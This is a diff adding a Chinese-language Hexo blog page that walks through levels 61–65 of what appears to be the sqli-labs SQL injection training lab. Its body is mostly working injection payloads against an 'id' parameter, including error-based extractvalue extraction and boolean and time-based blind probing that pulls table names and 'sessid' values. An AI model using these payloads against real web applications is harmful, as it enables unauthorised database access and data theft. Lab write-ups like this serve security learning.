@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>sql 61-65关 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="sql第六十一关 1.输入?id&#x3D;1’))–+闭合 2.输入?id&#x3D;1’)) and extractvalue(1,concat(0x5e,database(),0x5e))–+爆库 3.再输入?id&#x3D;1’)) and extractvalue(1,concat(0x5e,(select group_concat(table_name) from informatio">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql 61-65关">
+<meta property="og:url" content="http://example.com/2022/12/28/sql-61-65%E5%85%B3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sql第六十一关 1.输入?id&#x3D;1’))–+闭合 2.输入?id&#x3D;1’)) and extractvalue(1,concat(0x5e,database(),0x5e))–+爆库 3.再输入?id&#x3D;1’)) and extractvalue(1,concat(0x5e,(select group_concat(table_name) from informatio">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-12-28T15:25:11.000Z">
+<meta property="article:modified_time" content="2023-04-13T15:49:15.407Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-sql-61-65关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/12/28/sql-61-65%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2022-12-28T15:25:11.000Z" itemprop="datePublished">2022-12-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      sql 61-65关
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>sql第六十一关</p>
+<p>1.输入?id&#x3D;1’))–+闭合</p>
+<p>2.输入?id&#x3D;1’)) and extractvalue(1,concat(0x5e,database(),0x5e))–+爆库</p>
+<p>3.再输入?id&#x3D;1’)) and extractvalue(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5e))–+爆新表</p>
+<p>4.再输入?id&#x3D;1’)) and extractvalue(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’zq0a7yoz5c’),0x5e))–+爆字段</p>
+<p>5.输入?id&#x3D;1’)) and extractvalue(1,concat(0x5e,(select group_concat(sessid) from zq0a7yoz5c),0x5e))–+爆数据</p>
+<p>sql第六十二关</p>
+<p>1.这关有130次试错机会，输入?id&#x3D;1’)–+确定闭合点就是’)</p>
+<p>2.输入?id&#x3D;-1 ‘) union 1,2,3–+ union注入不能用，输入?id&#x3D;1 ‘) and extractvalue(1,concat(0x7e,database()))–+报错注入不能用，只能用布尔&#x2F;时间注入了</p>
+<p>3.输入?id&#x3D;1’) and length(database())&gt;5–+判断库长度</p>
+<p>4.接下来略，130就是给盲注用的</p>
+<p>sql第六十三关</p>
+<p>1.输入?id&#x3D;1’–+确定闭合点就是’</p>
+<p>2.输入?id&#x3D;1’ and length(database())&gt;5–+判断库长度</p>
+<p>3.输入?id&#x3D;1’ and substr(database(),1,1)&gt;’m’ –+判断数据库第一个字母</p>
+<p>4.略</p>
+<p>sql1第六十四关</p>
+<p>1.输入?id&#x3D;1，查看正常输入时页面反馈，输入?id&#x3D;1 and 1&#x3D;2，可以确定是数字型，输入?id&#x3D;1–+尝试闭合，输入?id&#x3D;1)–+尝试闭合,闭合点不是)，输入?id&#x3D;1))–+确定闭合点就是))</p>
+<p>2.输入?id&#x3D;1)) and if(length(database())&gt;5,sleep(3),1)–+判断库长度</p>
+<p>3.输入?id&#x3D;1)) and if(substr(database(),1,1)&gt;’m’,sleep(3),1) –+判断数据库第一个字母</p>
+<p>4.接下来略</p>
+<p>sql第六十五关</p>
+<p>1.输入?id&#x3D;1”)–+确定闭合点就是”)</p>
+<p>2.输入?id&#x3D;1”) and if(substr(database(),1,1)&gt;’m’,sleep(3),1) –+判断数据库第一个字母</p>
+<p>3.输入?id&#x3D;1”) and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;5,sleep(3),1)–+判断数据表张数&gt;5</p>
+<p>4.输入?id&#x3D;1”) and if(length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;5,sleep(3),1) –+判断第一张数据表的长度&gt;5</p>
+<p>5.输入?id&#x3D;1”) and if(mid((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)&gt;’m’,sleep(3),1)–+判断第一张数据表的第一个字母&gt;m</p>
+<p>6.输入?id&#x3D;1”) and if((select count(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’r8ucam3hep’)&gt;5,sleep(3),1) –+判断字段数&gt;5</p>
+<p>7.输入?id&#x3D;1”) and if(length((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’r8ucam3hep’ limit 0,1))&gt;5,sleep(3),1)–+判断第一个字段的长度</p>
+<p>8.输入?id&#x3D;1”) and if(mid((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’r8ucam3hep’ limit 0,1),1,1)&gt;’m’,sleep(3),1)–+判断第一个字段第一个字母</p>
+<p>9.输入?id&#x3D;1”) and if((select count(sessid) from r8ucam3hep)&gt;5,sleep(3),1)–+判断sessid记录&gt;5</p>
+<p>10.输入?id&#x3D;1”) and if(length((select sessid from r8ucam3hep limit 0,1))&gt;5,sleep(3),1) –+判断sessid第一条记录长度&gt;5</p>
+<p>11.输入?id&#x3D;1”) and if(mid((select sessid from r8ucam3hep limit 0,1),1,1)&gt;’m’,sleep(3),1)–+判断第一条记录的第一个字母&gt;m</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/12/28/sql-61-65%E5%85%B3/" data-id="clgfaq3k20000o0xxfykl3vwl" data-title="sql 61-65关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/04/11/sql-26-30%E5%85%B3/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          sql 26-30关
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/12/27/sql-51-55%E5%85%B3/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">sql 51-55关</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/12/22/sql-36-40%E5%85%B3/">sql 36-40关</a>
+          </li>
+        
+          <li>
+            <a href="/2023/12/15/sql-11-15%E5%85%B3/">sql 11-15关</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/12/sql-41-45%E5%85%B3/">sql 41-45关</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/11/sql-26-30%E5%85%B3/">sql 26-30关</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/28/sql-61-65%E5%85%B3/">sql 61-65关</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
